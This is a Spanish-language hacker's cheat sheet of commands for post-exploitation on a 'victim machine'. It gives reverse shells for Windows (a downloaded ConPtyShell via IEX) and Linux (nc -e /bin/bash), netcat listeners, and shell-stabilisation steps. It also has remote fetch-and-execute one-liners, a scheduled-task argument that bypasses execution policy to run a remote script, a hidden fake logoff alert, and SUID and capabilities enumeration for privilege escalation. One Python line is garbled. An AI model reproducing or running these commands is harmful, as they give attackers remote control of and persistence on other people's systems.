Para tener una shell manejable (IMPORTANTE QUE SEA EN BASH NO SZSH):
	1. ejecutar = "script /dev/null -c bash"
	2. oprimir ctr+z
	3. ejecutar = "stty raw -echo"
	4. ejecutar = "fg" y damos enter (las letras "fg" no se van a ver)
	5. ingresar "reset" y enter (el "reset" no se ve)
	6. ejecutar = "export TERM=xterm"
	7. ejecutar = "export SHELL=bash"
para setear las proporciones de una shell:
	1. ver las proporciones de mi shell local -> ejecutar localmente = "stty -a"
	2. ejecutar en la máquina victima = "stty rows <<rows mias>> columns <<columns mias>>"
para poner a escuchar un puerto:
	1. nc -nlvp <<port>>
	2.1. stty raw -echo; (stty size; cat) | nc -lvnp 443
reverse-shell for windows:
	IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.4 443
reverse-shell for linux:
		nc -e /bin/bash 192.168.0.4 443
remote code:
	Invoke-Expression "python -c 'import os; os.system(""curl 192.168.0.4"")'"
	Invoke-Command {python -c "import os;os.system('curl 192.168.0.3:8080')"}
Argumento en tarea programada para windows:
	- Argument: -executionpolicy bypass IEX(IWR https://raw.githubusercontent.com/AndresFelipeGualdron/scripts/master/connection.ps1);
Mostrar alerta en windows:
	- powershell -WindowStyle hidden -Command "& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Automatic logoff after 1 hour of inactivity','WARNING')}"
Enviar archivos en windows:
	- scp archivo_a_subir.zip <<username>>@<<ip>>:/var/www/example.com/
Ejecutar código remoto en python 3:
	- python -c 'import urllib2;r=urllib2.urlopen("https://raw.githubusercontent.com/n00py/ReadingList/master/test.py");exec(http://r.read())'
Encontrar permiso suid:
	find \-perm -4000 2>/dev/null
Archivos para agregar funciones a las consolas:
	para zsh -> ~/.zshrc
	para bash -> ~/.hashrc
Convertir hexadecimal de un archivo:
	xxd -ps -r
Capabilities:
	getcap -r / 2>/dev/null
Iniciar servidor web python:
	python3 -m http.server 80
Iniciar servicio ssh powershell:
	Get-Service -Name *ssh* | Start-Service
Parar servicio ssh powershell:
	Get-Service -Name *ssh* | Stop-Service